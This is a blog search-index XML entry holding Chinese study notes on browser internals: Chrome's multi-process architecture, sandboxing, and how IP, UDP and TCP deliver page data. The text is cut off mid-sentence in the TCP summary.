<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title></title>
      <link href="/2022/10/15/views/%E5%89%8D%E7%AB%AF/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/"/>
      <url>/2022/10/15/views/%E5%89%8D%E7%AB%AF/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote></blockquote><hr><p>title: 浏览器的工作原理与实践<br>date: 2022-10-15<br>updated: 2022-10-15<br>tags:</p><ul><li>知识<br>categories:</li><li>前端</li></ul><hr><h1 id="浏览器的工作原理与实践"><a href="#浏览器的工作原理与实践" class="headerlink" title="浏览器的工作原理与实践"></a>浏览器的工作原理与实践</h1><blockquote><h2 id="参透了浏览器的工作原理，你就能解决-80-的前端难题！"><a href="#参透了浏览器的工作原理，你就能解决-80-的前端难题！" class="headerlink" title="参透了浏览器的工作原理，你就能解决 80%的前端难题！"></a>参透了浏览器的工作原理，你就能解决 80%的前端难题！</h2><h3 id="对于应用，浏览器的地位一直很重要"><a href="#对于应用，浏览器的地位一直很重要" class="headerlink" title="对于应用，浏览器的地位一直很重要"></a>对于应用，浏览器的地位一直很重要</h3><p>我从浏览器的发展历程中梳理出了<strong>三个大的进化路线，希望能让你了解目前的 Web 应用到底能做什么，以及未来能适用于那些新领域</strong>。</p><ol><li>应用程序 Web 化</li><li>Web 应用移动化</li><li>Web 操作系统化</li></ol><h5 id="为什么需要学习浏览器工作原理？"><a href="#为什么需要学习浏览器工作原理？" class="headerlink" title="为什么需要学习浏览器工作原理？"></a>为什么需要学习浏览器工作原理？</h5><ol><li>准确评估 Web 开发项目的可行性</li><li>从更高维度审视页面</li><li>在快节奏的技术迭代中把握本质</li></ol><p>​ 整理时间:2022&#x2F;10</p></blockquote><h1 id="目录"><a href="#目录" class="headerlink" title="#目录"></a>#目录</h1><p>[TOC]</p><h1 id="一、宏观视角下的浏览器"><a href="#一、宏观视角下的浏览器" class="headerlink" title="一、宏观视角下的浏览器"></a>一、宏观视角下的浏览器</h1><p>无论你是想要设计高性能 Web 应用，还是要优化现有的 Web 应用，你都需要了解浏览器中的网络流程、页面渲染过程，JavaScript 执行流程，以及 Web 安全理论，而这些功能是分散在浏览器的各个功能组件中的，比较多、比较散，要怎样学习才能掌握呢？通过浏览器的多进程架构的学习，你就可以把这些分散的知识点串起来，组成一张网，从而让自己能站在更高的维度去理解 Web 应用。</p><p>因此，<strong>学习浏览器的多进程架构是很有必要的</strong>。需要说明的是，<strong>在本专栏中，我所有的分析都是基于 Chrome 浏览器的</strong>。那么多浏览器，为什么偏偏选择 Chrome 浏览器呢？因为 Chrome、微软的 Edge 以及国内的大部分主流浏览器，都是基于 Chromium 二次开发而来；而 Chrome 是 Google 的官方发行版，特性和 Chromium 基本一样，只存在一些产品层面差异；再加上 Chrome 是目前世界上使用率最高的浏览器，所以<strong>Chrome 最具代表性。</strong></p><h2 id="1-Chrome-架构：仅仅打开了-1-个页面，为什么有-4-个进程？"><a href="#1-Chrome-架构：仅仅打开了-1-个页面，为什么有-4-个进程？" class="headerlink" title="1. Chrome 架构：仅仅打开了 1 个页面，为什么有 4 个进程？"></a>1. Chrome 架构：仅仅打开了 1 个页面，为什么有 4 个进程？</h2><p>在解答这个问题之前，我们需要了解一下进程的概念，不过由于好多人容易把进程和线程的概念混淆，从而影响后续其他概念的理解，所以这里我就将这两个概念以及它们之间的关系一并为你讲解下。</p><h3 id="1-1、进程和线程"><a href="#1-1、进程和线程" class="headerlink" title="1.1、进程和线程"></a>1.1、进程和线程</h3><p>在介绍进程和线程之前，我需要先讲解下什么是并行处理，因为如果你理解了并行处理的概念，那么再理解进程和线程之间的关系就会变得轻松许多。</p><h3 id="1-2、什么是并行处理"><a href="#1-2、什么是并行处理" class="headerlink" title="1.2、什么是并行处理"></a>1.2、什么是并行处理</h3><p>计算机中的并行处理就是同一时刻处理多个任务，比如我们要计算下面这三个表达式的值，并显示出结果。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">A = <span class="number">1</span> + <span class="number">2</span></span><br><span class="line"></span><br><span class="line">B = <span class="number">20</span> / <span class="number">5</span></span><br><span class="line"></span><br><span class="line">C = <span class="number">7</span> * <span class="number">8</span></span><br></pre></td></tr></table></figure><p>在编写代码的时候，我们可以把这个过程拆分为四个任务：</p><ul><li><strong>任务 1</strong> 是计算 A&#x3D;1+2；</li><li><strong>任务 2</strong> 是计算 B&#x3D;20&#x2F;5；</li><li><strong>任务 3</strong> 是计算 C&#x3D;7*8；</li><li><strong>任务 4</strong> 是显示最后计算的结果。</li></ul><p>正常情况下程序可以使用<strong>单线程</strong>来处理，也就是分四步按照顺序分别执行这四个任务。</p><p>如果采用<strong>多线程</strong>，会怎么样呢？我们只需分“两步走”：第一步，使用三个线程同时执行前三个任务；第二步，再执行第四个显示任务。</p><p>通过对比分析，你会发现用单线程执行需要四步，而使用多线程只需要两步。因此，<strong>使用并行处理能大大提升性能</strong>。</p><h3 id="1-3、什么是线程"><a href="#1-3、什么是线程" class="headerlink" title="1.3、什么是线程"></a>1.3、什么是线程</h3><p>线程分为<strong>单线程</strong>和<strong>多线程</strong></p><p>多线程可以并行处理任务</p><p>但是<strong>线程是不能单独存在的，它是由进程来启动和管理的</strong></p><h3 id="1-4、什么是进程"><a href="#1-4、什么是进程" class="headerlink" title="1.4、什么是进程"></a>1.4、什么是进程</h3><p><strong>一个进程就是一个程序的运行实例</strong>。详细解释就是，启动一个程序的时候，操作系统会为该程序创建一块内存，用来存放代码、运行中的数据和一个执行任务的主线程，我们把这样的一个运行环境叫<strong>进程</strong>。</p><p>为了让你更好地理解上述计算过程，我画了下面这张对比图：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013114601490.png" alt="image-20221013114601490"></p><p>从图中可以看到，<strong>线程是依附于进程的，而进程中使用多线程并行处理能提升运算效率</strong>。</p><h3 id="1-5、进程和线程的-4-个特点-x3D-gt-重点"><a href="#1-5、进程和线程的-4-个特点-x3D-gt-重点" class="headerlink" title="1.5、进程和线程的 4 个特点&#x3D;&gt;重点"></a>1.5、进程和线程的 4 个特点&#x3D;&gt;重点</h3><p><strong>1. 进程中的任意一线程执行出错，都会导致整个进程的崩溃。</strong></p><p>我们可以模拟以下场景：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">A = <span class="number">1</span> + <span class="number">2</span></span><br><span class="line"></span><br><span class="line">B = <span class="number">20</span> / <span class="number">0</span></span><br><span class="line"></span><br><span class="line">C = <span class="number">7</span> * <span class="number">8</span></span><br></pre></td></tr></table></figure><p>我把上述三个表达式稍作修改，在计算 B 的值的时候，我把表达式的分母改成 0，当线程执行到 B &#x3D; 20&#x2F;0 时，由于分母为 0，线程会执行出错，这样就会导致整个进程的崩溃，当然另外两个线程执行的结果也没有了。</p><p><strong>2. 线程之间共享进程中的数据。</strong></p><p>如下图所示，线程之间可以对进程的公共数据进行读写操作。</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013115009743.png" alt="image-20221013115009743"></p><p>从上图可以看出，线程 1、线程 2、线程 3 分别把执行的结果写入 A、B、C 中，然后线程 2 继续从 A、B、C 中读取数据，用来显示执行结果。</p><p><strong>3. 当一个进程关闭之后，操作系统会回收进程所占用的内存。</strong></p><p>当一个进程退出时，操作系统会回收该进程所申请的所有资源；即使其中任意线程因为操作不当导致内存泄漏，当进程退出时，这些内存也会被正确回收。</p><p>比如之前的 IE 浏览器，支持很多插件，而这些插件很容易导致内存泄漏，这意味着只要浏览器开着，内存占用就有可能会越来越多，但是当关闭浏览器进程时，这些内存就都会被系统回收掉。</p><blockquote><p>内存泄漏（Memory Leak）是指程序中已动态分配的堆内存由于某种原因程序未释放或无法释放，造成系统内存的浪费，导致程序运行速度减慢甚至系统崩溃等严重后果。</p></blockquote><p><strong>4. 进程之间的内容相互隔离。</strong></p><p>进程隔离是为保护操作系统中进程互不干扰的技术，每一个进程只能访问自己占有的数据，也就避免出现进程 A 写入数据到进程 B 的情况。正是因为进程之间的数据是严格隔离的，所以一个进程如果崩溃了，或者挂起了，是不会影响到其他进程的。如果进程之间需要进行数据的通信，这时候，就需要使用用于进程间通信（IPC）的机制了。</p><h3 id="单进程浏览器时代"><a href="#单进程浏览器时代" class="headerlink" title="单进程浏览器时代"></a>单进程浏览器时代</h3><p>在了解了进程和线程之后，我们再来一起看下单进程浏览器的架构。顾名思义，<strong>单进程浏览器是指浏览器的所有功能模块都是运行在同一个进程里</strong>，这些模块包含了网络、插件、JavaScript 运行环境、渲染引擎和页面等。其实早在 2007 年之前，市面上浏览器都是单进程的。单进程浏览器的架构如下图所示：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013120234080.png" alt="image-20221013120234080"></p><p>如此多的功能模块运行在一个进程里，是导致单进程浏览器<strong>不稳定</strong>、<strong>不流畅</strong>和<strong>不安全</strong>的一个主要因素。下面我就来一一分析下出现这些问题的原因。</p><h4 id="问题-1：不稳定"><a href="#问题-1：不稳定" class="headerlink" title="问题 1：不稳定"></a>问题 1：不稳定</h4><p>早期浏览器需要借助于<strong>插件</strong>来实现诸如 Web 视频、Web 游戏等各种强大的功能，但是插件是最容易出问题的模块，并且还运行在浏览器进程之中，所以一个插件的意外崩溃会引起整个浏览器的崩溃。</p><p>除了插件之外，<strong>渲染引擎模块</strong>也是不稳定的，通常一些复杂的 JavaScript 代码就有可能引起渲染引擎模块的崩溃。和插件一样，渲染引擎的崩溃也会导致整个浏览器的崩溃。</p><h4 id="问题-2：不流畅"><a href="#问题-2：不流畅" class="headerlink" title="问题 2：不流畅"></a>问题 2：不流畅</h4><p>从上面的“单进程浏览器架构示意图”可以看出，所有页面的渲染模块、JavaScript 执行环境以及插件都是运行在同一个线程中的，这就意味着同一时刻只能有一个模块可以执行。</p><p>比如，下面这个无限循环的脚本：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">freeze</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;freeze&quot;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">freeze</span>()</span><br></pre></td></tr></table></figure><p>如果让这个脚本运行在一个单进程浏览器的页面里，你感觉会发生什么？</p><p>因为这个脚本是无限循环的，所以当其执行时，它会独占整个线程，这样导致其他运行在该线程中的模块就没有机会被执行。因为浏览器中所有的页面都运行在该线程中，所以这些页面都没有机会去执行任务，这样就会导致整个浏览器失去响应，变卡顿。这块内容要继续往深的地方讲就到页面的事件循环系统了，具体相关内容我会在后面的模块中为你深入讲解。</p><p>除了上述<strong>脚本</strong>或者<strong>插件</strong>会让单进程浏览器变卡顿外，<strong>页面的内存泄漏</strong>也是单进程变慢的一个重要原因。通常浏览器的内核都是非常复杂的，运行一个复杂点的页面再关闭页面，会存在内存不能完全回收的情况，这样导致的问题是使用时间越长，内存占用越高，浏览器会变得越慢。</p><h4 id="问题-3：不安全"><a href="#问题-3：不安全" class="headerlink" title="问题 3：不安全"></a>问题 3：不安全</h4><p>这里依然可以从插件和页面脚本两个方面来解释该原因。</p><p>插件可以使用 C&#x2F;C++ 等代码编写，通过插件可以获取到操作系统的任意资源，当你在页面运行一个插件时也就意味着这个插件能完全操作你的电脑。如果是个恶意插件，那么它就可以释放病毒、窃取你的账号密码，引发安全性问题。</p><p>至于页面脚本，它可以通过浏览器的漏洞来获取系统权限，这些脚本获取系统权限之后也可以对你的电脑做一些恶意的事情，同样也会引发安全问题。</p><p>以上这些就是当时浏览器的特点，不稳定，不流畅，而且不安全。这是一段不堪回首的过去，也许你没有经历过，不过你可以想象一下这样的场景：当你正在用浏览器打开多个页面时，突然某个页面崩溃了或者失去响应，随之而来的是整个浏览器的崩溃或者无响应，然后你发现你给老板写的邮件页面也随之消失了，这时你的心情会不会和页面一样崩溃呢？</p><h3 id="多进程浏览器时代"><a href="#多进程浏览器时代" class="headerlink" title="多进程浏览器时代"></a>多进程浏览器时代</h3><p>好在现代浏览器已经解决了这些问题，是如何解决的呢？这就得聊聊我们这个“多进程浏览器时代”了。</p><h4 id="早期多进程架构"><a href="#早期多进程架构" class="headerlink" title="早期多进程架构"></a>早期多进程架构</h4><p>你可以先看看下面这张图，这是 2008 年 Chrome 发布时的进程架构。</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013122000904.png" alt="image-20221013122000904"></p><p>从图中可以看出，Chrome 的页面是运行在单独的渲染进程中的，同时页面里的插件也是运行在单独的插件进程之中，而进程之间是通过 IPC 机制进行通信（如图中虚线部分）。</p><h5 id="解决不稳定的问题"><a href="#解决不稳定的问题" class="headerlink" title="解决不稳定的问题"></a><strong>解决不稳定的问题</strong></h5><p>由于进程是相互隔离的，所以当一个页面或者插件崩溃时，影响到的仅仅是当前的页面进程或者插件进程，并不会影响到浏览器和其他页面，这就完美地解决了页面或者插件的崩溃会导致整个浏览器崩溃，也就是不稳定的问题。</p><h5 id="解决不流畅的问题"><a href="#解决不流畅的问题" class="headerlink" title="解决不流畅的问题"></a><strong>解决不流畅的问题</strong></h5><p>同样，JavaScript 也是运行在渲染进程中的，所以即使 JavaScript 阻塞了渲染进程，影响到的也只是当前的渲染页面，而并不会影响浏览器和其他页面，因为其他页面的脚本是运行在它们自己的渲染进程中的。所以当我们再在 Chrome 中运行上面那个死循环的脚本时，没有响应的仅仅是当前的页面。</p><p>对于内存泄漏的解决方法那就更简单了，因为当关闭一个页面时，整个渲染进程也会被关闭，之后该进程所占用的内存都会被系统回收，这样就轻松解决了浏览器页面的内存泄漏问题。</p><h5 id="解决不安全的问题"><a href="#解决不安全的问题" class="headerlink" title="解决不安全的问题"></a><strong>解决不安全的问题</strong></h5><p>采用多进程架构的额外好处是可以使用<strong>安全沙箱</strong>，你可以把沙箱看成是操作系统给进程上了一把锁，沙箱里面的程序可以运行，但是不能在你的硬盘上写入任何数据，也不能在敏感位置读取任何数据，例如你的文档和桌面。Chrome 把插件进程和渲染进程锁在沙箱里面，这样即使在渲染进程或者插件进程里面执行了恶意程序，恶意程序也无法突破沙箱去获取系统权限。</p><p>好了，分析完早期的 Chrome 浏览器后，相信你已经了解了浏览器采用多进程架构的必要性。</p><h4 id="目前多进程架构"><a href="#目前多进程架构" class="headerlink" title="目前多进程架构"></a>目前多进程架构</h4><p>不过 Chrome 的发展是滚滚向前的，相较之前，目前的架构又有了很多新的变化。我们先看看最新的 Chrome 进程架构，你可以参考下图：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013124136519.png" alt="image-20221013124136519"></p><p>从图中可以看出，最新的 Chrome 浏览器包括：1 个浏览器（Browser）主进程、1 个 GPU 进程、1 个网络（NetWork）进程、多个渲染进程和多个插件进程。</p><p>下面我们来逐个分析下这几个进程的功能。</p><ul><li><strong>浏览器进程</strong>。主要负责界面显示、用户交互、子进程管理，同时提供存储等功能。</li><li><strong>渲染进程</strong>。核心任务是将 HTML、CSS 和 JavaScript 转换为用户可以与之交互的网页，排版引擎 Blink 和 JavaScript 引擎 V8 都是运行在该进程中，默认情况下，Chrome 会为每个 Tab 标签创建一个渲染进程。出于安全考虑，渲染进程都是运行在沙箱模式下。</li><li><strong>GPU 进程</strong>。其实，Chrome 刚开始发布的时候是没有 GPU 进程的。而 GPU 的使用初衷是为了实现 3D CSS 的效果，只是随后网页、Chrome 的 UI 界面都选择采用 GPU 来绘制，这使得 GPU 成为浏览器普遍的需求。最后，Chrome 在其多进程架构上也引入了 GPU 进程。</li><li><strong>网络进程</strong>。主要负责页面的网络资源加载，之前是作为一个模块运行在浏览器进程里面的，直至最近才独立出来，成为一个单独的进程。</li><li><strong>插件进程</strong>。主要是负责插件的运行，因插件易崩溃，所以需要通过插件进程来隔离，以保证插件进程崩溃不会对浏览器和页面造成影响。</li></ul><p>讲到这里，现在你应该就可以回答文章开头提到的问题了：仅仅打开了 1 个页面，为什么有 4 个进程？因为打开 1 个页面至少需要 1 个网络进程、1 个浏览器进程、1 个 GPU 进程以及 1 个渲染进程，共 4 个；如果打开的页面有运行插件的话，还需要再加上 1 个插件进程。</p><p>不过凡事都有两面性，虽然多进程模型提升了浏览器的稳定性、流畅性和安全性，但同样不可避免地带来了一些问题：</p><ul><li><strong>更高的资源占用</strong>。因为每个进程都会包含公共基础结构的副本（如 JavaScript 运行环境），这就意味着浏览器会消耗更多的内存资源。</li><li><strong>更复杂的体系架构</strong>。浏览器各模块之间耦合性高、扩展性差等问题，会导致现在的架构已经很难适应新的需求了。</li></ul><p>对于上面这两个问题，Chrome 团队一直在寻求一种弹性方案，既可以解决资源占用高的问题，也可以解决复杂的体系架构的问题。</p><h3 id="未来面向服务的架构"><a href="#未来面向服务的架构" class="headerlink" title="未来面向服务的架构"></a>未来面向服务的架构</h3><p>为了解决这些问题，在 2016 年，Chrome 官方团队使用“<strong>面向服务的架构</strong>”（Services Oriented Architecture，简称<strong>SOA</strong>）的思想设计了新的 Chrome 架构。也就是说 Chrome 整体架构会朝向现代操作系统所采用的“面向服务的架构” 方向发展，原来的各种模块会被重构成独立的服务（Service），每个服务（Service）都可以在独立的进程中运行，访问服务（Service）必须使用定义好的接口，通过 IPC 来通信，从而<strong>构建一个更内聚、松耦合、易于维护和扩展的系统</strong>，更好实现 Chrome 简单、稳定、高速、安全的目标。如果你对面向服务的架构感兴趣，你可以去网上搜索下资料，这里就不过多介绍了。</p><p>Chrome 最终要把 UI、数据库、文件、设备、网络等模块重构为基础服务，类似操作系统底层服务，下面是 Chrome“面向服务的架构”的进程模型图：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013124444079.png" alt="image-20221013124444079"></p><p>目前 Chrome 正处在老的架构向服务化架构过渡阶段，这将是一个漫长的迭代过程。</p><p>Chrome 正在逐步构建 Chrome 基础服务（Chrome Foundation Service），如果你认为 Chrome 是“便携式操作系统”，那么 Chrome 基础服务便可以被视为该操作系统的“基础”系统服务层。</p><p>同时 Chrome 还提供<strong>灵活的弹性架构</strong>，在强大性能设备上会以多进程的方式运行基础服务，但是如果在资源受限的设备上（如下图），Chrome 会将很多服务整合到一个进程中，从而节省内存占用。</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013124553586.png" alt="image-20221013124553586"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>本文我主要是从 Chrome 进程架构的视角，分析了浏览器的进化史。</p><p>最初的浏览器都是单进程的，它们不稳定、不流畅且不安全，之后出现了 Chrome，创造性地引入了多进程架构，并解决了这些遗留问题。随后 Chrome 试图应用到更多业务场景，如移动设备、VR、视频等，为了支持这些场景，Chrome 的架构体系变得越来越复杂，这种架构的复杂性倒逼 Chrome 开发团队必须进行架构的重构，最终 Chrome 团队选择了面向服务架构（SOA）形式，这也是 Chrome 团队现阶段的一个主要任务。</p><p>鉴于目前架构的复杂性，要完整过渡到面向服务架构，估计还需要好几年时间才能完成。不过 Chrome 开发是一个渐进的过程，新的特性会一点点加入进来，这也意味着我们随时能看到 Chrome 新的变化。</p><p>总体说来，<strong>Chrome 是以一个非常快速的速度在进化，越来越多的业务和应用都逐渐转至浏览器来开发，身为开发人员，我们不能坐视不管，而应该紧跟其步伐，收获这波技术红利</strong>。</p><h2 id="2-TCP-协议：如何保证页面文件能被完整送达浏览器？"><a href="#2-TCP-协议：如何保证页面文件能被完整送达浏览器？" class="headerlink" title="2. TCP 协议：如何保证页面文件能被完整送达浏览器？"></a>2. TCP 协议：如何保证页面文件能被完整送达浏览器？</h2><p>在衡量 Web 页面性能的时候有一个重要的指标叫“<strong>FP（First Paint）</strong>”，是<strong>指从页面加载到首次开始绘制的时长</strong>。这个指标直接影响了用户的跳出率，更快的页面响应意味着更多的 PV、更高的参与度，以及更高的转化率。那什么影响 FP 指标呢？其中一个重要的因素是<strong>网络加载速度</strong>。</p><p>要想优化 Web 页面的加载速度，你需要对网络有充分的了解。而理解网络的关键是要对网络协议有深刻的认识，不管你是使用 HTTP，还是使用 WebSocket，它们都是基于 TCP&#x2F;IP 的，如果你对这些原理有足够了解，也就清楚如何去优化 Web 性能，或者能更轻松地定位 Web 问题了。此外，TCP&#x2F;IP 的设计思想还有助于拓宽你的知识边界，从而在整体上提升你对项目的理解和解决问题的能力。</p><p>因此，在这篇文章中，我会给你<strong>重点介绍在 Web 世界中的 TCP&#x2F;IP 是如何工作的</strong>。当然，协议并不是本专栏的重点，这篇文章我会从我的角度结合 HTTP 来分析网络请求的核心路径，如果你想对网络协议有更深入的理解，那我推荐你学习刘超老师的《趣谈网络协议》专栏，以及陶辉老师的《Web 协议详解与抓包实战》视频课程。</p><p>好，接下来我们回到正题，开始今天的内容。在网络中，一个文件通常会被拆分为很多数据包来进行传输，而数据包在传输过程中又有很大概率丢失或者出错。<strong>那么如何保证页面文件能被完整地送达浏览器呢？</strong></p><p><strong>这篇文章将站在数据包的视角，给出问题答案。</strong></p><h3 id="一个数据包的“旅程”"><a href="#一个数据包的“旅程”" class="headerlink" title="一个数据包的“旅程”"></a>一个数据包的“旅程”</h3><p>下面我将分别从</p><ul><li>“数据包如何送达主机”</li><li>“主机如何将数据包转交给应用”</li><li>“数据是如何被完整地送达应用程序”</li></ul><p>这三个角度来为你讲述数据的传输过程。</p><p><strong>互联网，实际上是一套理念和协议组成的体系架构</strong>。其中，协议是一套众所周知的规则和标准，如果各方都同意使用，那么它们之间的通信将变得毫无障碍。</p><p>互联网中的数据是通过数据包来传输的。如果发送的数据很大，那么该数据就会被拆分为很多小数据包来传输。比如你现在听的音频数据，是拆分成一个个小的数据包来传输的，并不是一个大的文件一次传输过来的。</p><h4 id="1-IP：把数据包送达目的主机"><a href="#1-IP：把数据包送达目的主机" class="headerlink" title="1. IP：把数据包送达目的主机"></a>1. IP：把数据包送达目的主机</h4><p>数据包要在互联网上进行传输，就要符合<strong>网际协议</strong>（Internet Protocol，简称<strong>IP</strong>）标准。互联网上不同的在线设备都有唯一的地址，地址只是一个数字，这和大部分家庭收件地址类似，你只需要知道一个家庭的具体地址，就可以往这个地址发送包裹，这样物流系统就能把物品送到目的地。</p><p><strong>计算机的地址就称为 IP 地址，访问任何网站实际上只是你的计算机向另外一台计算机请求信息。</strong></p><p>如果要想把一个数据包从主机 A 发送给主机 B，那么在传输之前，数据包上会被附加上主机 B 的 IP 地址信息，这样在传输过程中才能正确寻址。额外地，数据包上还会附加上主机 A 本身的 IP 地址，有了这些信息主机 B 才可以回复信息给主机 A。这些附加的信息会被装进一个叫 IP 头的数据结构里。IP 头是 IP 数据包开头的信息，包含 IP 版本、源 IP 地址、目标 IP 地址、生存时间等信息。如果你要详细了解 IP 头信息，可以参考<a href="https://zh.wikipedia.org/wiki/%E4%BC%A0%E8%BE%93%E6%8E%A7%E5%88%B6%E5%8D%8F%E8%AE%AE">该链接</a>。</p><p>为了方便理解，我先把网络简单分为三层结构，如下图：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013130354855.png" alt="image-20221013130354855"></p><p>下面我们一起来看下一个数据包从主机 A 到主机 B 的旅程：</p><ul><li>上层将含有“极客时间”的数据包交给网络层；</li><li>网络层再将 IP 头附加到数据包上，组成新的 <strong>IP 数据包</strong>，并交给底层；</li><li>底层通过物理网络将数据包传输给主机 B；</li><li>数据包被传输到主机 B 的网络层，在这里主机 B 拆开数据包的 IP 头信息，并将拆开来的数据部分交给上层；</li><li>最终，含有“极客时间”信息的数据包就到达了主机 B 的上层了。</li></ul><h4 id="2-UDP：把数据包送达应用程序"><a href="#2-UDP：把数据包送达应用程序" class="headerlink" title="2. UDP：把数据包送达应用程序"></a>2. UDP：把数据包送达应用程序</h4><p>IP 是非常底层的协议，只负责把数据包传送到对方电脑，但是对方电脑并不知道把数据包交给哪个程序，是交给浏览器还是交给王者荣耀？因此，需要基于 IP 之上开发能和应用打交道的协议，最常见的是“<strong>用户数据包协议</strong>（User Datagram Protocol）”，简称<strong>UDP</strong>。</p><p>UDP 中一个最重要的信息是<strong>端口号</strong>，端口号其实就是一个数字，每个想访问网络的程序都需要绑定一个端口号。通过端口号 UDP 就能把指定的数据包发送给指定的程序了，所以<strong>IP 通过 IP 地址信息把数据包发送给指定的电脑，而 UDP 通过端口号把数据包分发给正确的程序</strong>。和 IP 头一样，端口号会被装进 UDP 头里面，UDP 头再和原始数据包合并组成新的 UDP 数据包。UDP 头中除了目的端口，还有源端口号等信息。</p><p>为了支持 UDP 协议，我把前面的三层结构扩充为四层结构，在网络层和上层之间增加了传输层，如下图所示：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013130931073.png" alt="image-20221013130931073"></p><p>下面我们一起来看下一个数据包从主机 A 旅行到主机 B 的路线：</p><ul><li>上层将含有“极客时间”的数据包交给传输层；</li><li>传输层会在数据包前面附加上<strong>UDP 头</strong>，组成新的 UDP 数据包，再将新的 UDP 数据包交给网络层；</li><li>网络层再将 IP 头附加到数据包上，组成新的 IP 数据包，并交给底层；</li><li>数据包被传输到主机 B 的网络层，在这里主机 B 拆开 IP 头信息，并将拆开来的数据部分交给传输层；</li><li>在传输层，数据包中的 UDP 头会被拆开，<strong>并根据 UDP 中所提供的端口号，把数据部分交给上层的应用程序</strong>；</li><li>最终，含有“极客时间”信息的数据包就旅行到了主机 B 上层应用程序这里。</li></ul><p>在使用 UDP 发送数据时，有各种因素会导致数据包出错，虽然 UDP 可以校验数据是否正确，但是对于错误的数据包，UDP 并不提供重发机制，只是丢弃当前的包，而且 UDP 在发送之后也无法知道是否能达到目的地。</p><p>虽说<strong>UDP 不能保证数据可靠性，但是传输速度却非常快</strong>，所以 UDP 会应用在一些关注速度、但不那么严格要求数据完整性的领域，如在线视频、互动游戏等。</p><h4 id="3-TCP：把数据完整地送达应用程序"><a href="#3-TCP：把数据完整地送达应用程序" class="headerlink" title="3. TCP：把数据完整地送达应用程序"></a>3. TCP：把数据完整地送达应用程序</h4><p>对于浏览器请求，或者邮件这类要求数据传输可靠性（reliability）的应用，如果使用 UDP 来传输会存在<strong>两个问题</strong>：</p><ul><li>数据包在传输过程中容易丢失；</li><li>大文件会被拆分成很多小的数据包来传输，这些小的数据包会经过不同的路由，并在不同的时间到达接收端，而 UDP 协议并不知道如何组装这些数据包，从而把这些数据包还原成完整的文件。</li></ul><p>基于这两个问题，我们引入 TCP 了。<strong>TCP（Transmission Control Protocol，传输控制协议）是一种面向连接的、可靠的、基于字节流的传输层通信协议</strong>。相对于 UDP，TCP 有下面两个特点:</p><ul><li>对于数据包丢失的情况，TCP 提供重传机制；</li><li>TCP 引入了数据包排序机制，用来保证把乱序的数据包组合成一个完整的文件。</li></ul><p>和 UDP 头一样，TCP 头除了包含了目标端口和本机端口号外，还提供了用于排序的序列号，以便接收端通过序号来重排数据包。</p><p>下面看看 TCP 下的单个数据包的传输流程：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013130955829.png" alt="image-20221013130955829"></p><p>通过上图你应该可以了解一个数据包是如何通过 TCP 来传输的。TCP 单个数据包的传输流程和 UDP 流程差不多，不同的地方在于，通过 TCP 头的信息保证了一块大的数据传输的完整性。</p><p>下面我们再看下<strong>完整的 TCP 连接过程</strong>，通过这个过程你可以明白 TCP 是如何保证重传机制和数据包的排序功能的。</p><p>从下图可以看出，一个完整的 TCP 连接的生命周期包括了“<strong>建立连接</strong>”“<strong>传输数据</strong>”和“<strong>断开连接</strong>”三个阶段。</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013131011530.png" alt="image-20221013131011530"></p><ul><li><strong>首先，建立连接阶段</strong>。这个阶段是通过“三次握手”来建立客户端和服务器之间的连接。TCP 提供面向连接的通信传输。<strong>面向连接</strong>是指在数据通信开始之前先做好两端之间的准备工作。所谓<strong>三次握手</strong>，是指在建立一个 TCP 连接时，客户端和服务器总共要发送三个数据包以确认连接的建立。</li><li><strong>其次，传输数据阶段</strong>。在该阶段，<strong>接收端需要对每个数据包进行确认操作</strong>，也就是接收端在接收到数据包之后，需要发送确认数据包给发送端。所以当发送端发送了一个数据包之后，在规定时间内没有接收到接收端反馈的确认消息，则判断为数据包丢失，并触发发送端的重发机制。同样，一个大的文件在传输过程中会被拆分成很多小的数据包，这些数据包到达接收端后，接收端会按照 TCP 头中的序号为其排序，从而保证组成完整的数据。</li><li><strong>最后，断开连接阶段</strong>。数据传输完毕之后，就要终止连接了，涉及到最后一个阶段“四次挥手”来保证双方都能断开连接。</li></ul><p>到这里你应该就明白了，TCP 为了保证数据传输的可靠性，牺牲了数据包的传输速度，因为“三次握手”和“数据包校验机制”等把传输过程中的数据包的数量提高了一倍。</p><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>好了，这一节就到这里，下面我来做一个简单的总结。</p><ul><li>互联网中的数据是通过数据包来传输的，数据包在传输过程中容易丢失或出错。</li><li>IP 负责把数据包送达目的主机。</li><li>UDP 负责把数据包送达具体应用。</li><li>而 TCP 